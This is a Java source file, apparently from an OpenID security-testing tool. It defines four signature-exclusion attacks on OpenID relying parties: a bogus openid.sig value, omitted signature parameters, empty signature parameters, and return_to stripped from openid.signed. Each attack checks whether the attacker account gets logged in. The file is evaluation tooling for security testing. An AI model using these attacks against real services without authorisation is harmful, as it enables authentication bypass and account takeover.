/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

package wsattacker.sso.openid.attacker.evaluation.attack;

import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult;
import wsattacker.sso.openid.attacker.evaluation.attack.Attack;
import wsattacker.sso.openid.attacker.evaluation.attack.AbstractAttack;
import wsattacker.sso.openid.attacker.attack.parameter.AttackParameter;
import wsattacker.sso.openid.attacker.attack.parameter.utilities.HttpMethod;
import wsattacker.sso.openid.attacker.config.OpenIdServerConfiguration;
import wsattacker.sso.openid.attacker.evaluation.LoginResult;
import wsattacker.sso.openid.attacker.evaluation.ServiceProvider;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Interpretation;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Result;

/**
 *
 * @author christiankossmann
 */
public class SignatureExclusionAttack extends AbstractAttack {

    public SignatureExclusionAttack(ServiceProvider serviceProvider) {
        super(serviceProvider);
    } 
    
    /**
     * 1. Attack: The value of openid.sig is set to an incorrect value
     *            (e.g. 'xyz').
     * @return 
     */
    @Attack(number = 0)
    private AttackResult performInvalidSignatureAttack() {
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);

        String description = "The value of openid.sig is set to an incorrect value (='xyz').";

        AttackParameter sigParam = keeper.getParameter("openid.sig");
        
        sigParam.setAttackValueUsedForSignatureComputation(true);
        sigParam.setAttackValue("xyz");
        
        // login
        LoginResult loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);
        boolean success = loginResult.getAuthenticatedUser() == ServiceProvider.User.ATTACKER;
        Result result = success ? Result.SUCCESS : Result.FAILURE;
        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        // special case: Direct verfication
        if (loginResult.hasDirectVerification() && success) {
            result = Result.NOT_PERFORMABLE;
            interpretation = Interpretation.NEUTRAL;
        }
        
        return new AttackResult(description, loginResult, result, interpretation);
    }
    
    /**
     * 2. Attack: The parameters openid.sig AND openid.signed are
     *            excluded.
     * @return 
     */
    @Attack(number = 1)
    private AttackResult peformExcludeSignatureParametersAttack() {
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);

        String description = "The parameters openid.sig AND openid.signed are excluded.";

        AttackParameter sigParam = keeper.getParameter("openid.sig");
        AttackParameter signedParam = keeper.getParameter("openid.signed");
        
        // exclude openid.sig
        sigParam.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParam.setAttackMethod(HttpMethod.DO_NOT_SEND);
        
        // exclude openid.signed
        signedParam.setValidMethod(HttpMethod.DO_NOT_SEND);
        signedParam.setAttackMethod(HttpMethod.DO_NOT_SEND);
        
        // login
        LoginResult loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);
        boolean success = loginResult.getAuthenticatedUser() == ServiceProvider.User.ATTACKER;
        Result result = success ? Result.SUCCESS : Result.FAILURE;
        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        // special case: Direct verfication
        if (loginResult.hasDirectVerification() && success) {
            interpretation = Interpretation.RESTRICTED;
        }
        
        return new AttackResult(description, loginResult, result, interpretation);
    }
    
    /**
     * 3. Attack: The parameters openid.sig AND openid.signed are
     *            set to an empty string.
     * @return 
     */
    @Attack(number = 2)
    private AttackResult performEmptySignatureParametersAttack() {
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);

        String description = "The parameters openid.sig AND openid.signed are set to ''.";

        AttackParameter sigParam = keeper.getParameter("openid.sig");
        AttackParameter signedParam = keeper.getParameter("openid.signed");
        
        // openid.sig = ""
        sigParam.setAttackValueUsedForSignatureComputation(true);
        sigParam.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParam.setAttackMethod(HttpMethod.GET);
        sigParam.setAttackValue("");
        
        // openid.signed = ""
        signedParam.setAttackValueUsedForSignatureComputation(true);
        signedParam.setValidMethod(HttpMethod.DO_NOT_SEND);
        signedParam.setAttackMethod(HttpMethod.GET);
        signedParam.setAttackValue("");
        
        // login
        LoginResult loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);
        boolean success = loginResult.getAuthenticatedUser() == ServiceProvider.User.ATTACKER;
        Result result = success ? Result.SUCCESS : Result.FAILURE;
        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        // special case: Direct verfication
        if (loginResult.hasDirectVerification() && success) {
            interpretation = Interpretation.RESTRICTED;
        }
        
        return new AttackResult(description, loginResult, result, interpretation);
    }
    
    /**
     * 4. Attack: One item is remove from openid.signed.
     * @return 
     */
    @Attack(number = 3)
    private AttackResult performExcludeOneSignatureParameterAttack() {
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);

        String description = "The parameters openid.return_to is remove from openid.signed.";

        AttackParameter sigParam = keeper.getParameter("openid.sig");
        AttackParameter signedParam = keeper.getParameter("openid.signed");
        
        // modify openid.signed
        String signedParamValidValue = signedParam.getValidValue();
        String signedParamAttackValue = signedParamValidValue.replace("return_to", "");
        signedParamAttackValue = signedParamAttackValue.replace(",,", ",");
        
        signedParam.setAttackValueUsedForSignatureComputation(true);
        signedParam.setAttackValue(signedParamAttackValue);
        signedParam.setValidMethod(HttpMethod.DO_NOT_SEND);
        signedParam.setAttackMethod(HttpMethod.GET);
        
        // set openid.sig
        sigParam.setAttackValueUsedForSignatureComputation(false);
        sigParam.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParam.setAttackMethod(HttpMethod.GET);
        
        // login
        LoginResult loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);
        boolean success = loginResult.getAuthenticatedUser() == ServiceProvider.User.ATTACKER;
        Result result = success ? Result.SUCCESS : Result.FAILURE;
        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        // special case: Direct verfication
        if (loginResult.hasDirectVerification() && success) {
            interpretation = Interpretation.RESTRICTED;
        }
        
        return new AttackResult(description, loginResult, result, interpretation);
    }

    /*@Override
    protected List<AttackResult> performAttacks() {
        List<AttackResult> attackResults = new ArrayList<>();
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);

        AttackParameter sigParam = keeper.getParameter("openid.sig");
        AttackParameter signedParam = keeper.getParameter("openid.signed");
        
        // #####################################################################
        // # 1. Attack: The value of openid.sig is set to an incorrect value
        // #            (e.g. 'xyz').
        // #####################################################################
        
        String description = "The value of openid.sig is set to an incorrect value (='xyz').";
        sigParam.setAttackValueUsedForSignatureComputation(true);
        sigParam.setAttackValue("xyz");
        
        // login
        LoginResult loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);
        boolean success = loginResult.getAuthenticatedUser() == ServiceProvider.User.ATTACKER;
        Result result = success ? Result.SUCCESS : Result.FAILURE;
        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        // special case: Direct verfication
        if (loginResult.hasDirectVerification()) {
            result = Result.NOT_PERFORMABLE;
            interpretation = Interpretation.NEUTRAL;
        }
        
        attackResults.add(new AttackResult(description, loginResult, result, interpretation));
        
        // #####################################################################
        // # 2. Attack: The parameters openid.sig AND openid.signed are
        //              excluded.
        // #####################################################################
        
        description = "The parameters openid.sig AND openid.signed are excluded.";
        
        // exclude openid.sig
        sigParam.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParam.setAttackMethod(HttpMethod.DO_NOT_SEND);
        
        // exclude openid.signed
        signedParam.setValidMethod(HttpMethod.DO_NOT_SEND);
        signedParam.setAttackMethod(HttpMethod.DO_NOT_SEND);
        
        // login
        loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);
        success = loginResult.getAuthenticatedUser() == ServiceProvider.User.ATTACKER;
        result = success ? Result.SUCCESS : Result.FAILURE;
        interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        // special case: Direct verfication
        if (loginResult.hasDirectVerification()) {
            interpretation = Interpretation.RESTRICTED;
        }
        
        attackResults.add(new AttackResult(description, loginResult, result, interpretation));
        
        // #####################################################################
        // # 3. Attack: The parameters openid.sig AND openid.signed are
        //              set to an empty string.
        // #####################################################################
        
        description = "The parameters openid.sig AND openid.signed are set to ''.";
        
        // openid.sig = ""
        sigParam.setAttackValueUsedForSignatureComputation(true);
        sigParam.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParam.setAttackMethod(HttpMethod.GET);
        sigParam.setAttackValue("");
        
        // openid.signed
        signedParam.setAttackValueUsedForSignatureComputation(true);
        signedParam.setValidMethod(HttpMethod.DO_NOT_SEND);
        signedParam.setAttackMethod(HttpMethod.GET);
        signedParam.setAttackValue("");
        
        // login
        loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);
        success = loginResult.getAuthenticatedUser() == ServiceProvider.User.ATTACKER;
        result = success ? Result.SUCCESS : Result.FAILURE;
        interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        // special case: Direct verfication
        if (loginResult.hasDirectVerification()) {
            interpretation = Interpretation.RESTRICTED;
        }
        
        attackResults.add(new AttackResult(description, loginResult, result, interpretation));
        
        // #####################################################################
        // # 4. Attack: One item is remove from openid.signed.
        // #####################################################################
        
        description = "The parameters openid.return_to is remove from openid.signed.";
                
        // modify openid.signed
        String signedParamValidValue = signedParam.getValidValue();
        String signedParamAttackValue = signedParamValidValue.replace("return_to", "");
        signedParamAttackValue = signedParamAttackValue.replace(",,", ",");
        
        signedParam.setAttackValueUsedForSignatureComputation(true);
        signedParam.setAttackValue(signedParamAttackValue);
        signedParam.setValidMethod(HttpMethod.DO_NOT_SEND);
        signedParam.setAttackMethod(HttpMethod.GET);
        
        // set openid.sig
        sigParam.setAttackValueUsedForSignatureComputation(false);
        sigParam.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParam.setAttackMethod(HttpMethod.GET);
        
        // login
        loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);
        success = loginResult.getAuthenticatedUser() == ServiceProvider.User.ATTACKER;
        result = success ? Result.SUCCESS : Result.FAILURE;
        interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        // special case: Direct verfication
        if (loginResult.hasDirectVerification()) {
            interpretation = Interpretation.RESTRICTED;
        }
        
        attackResults.add(new AttackResult(description, loginResult, result, interpretation));
        
        return attackResults;
    }*/
}
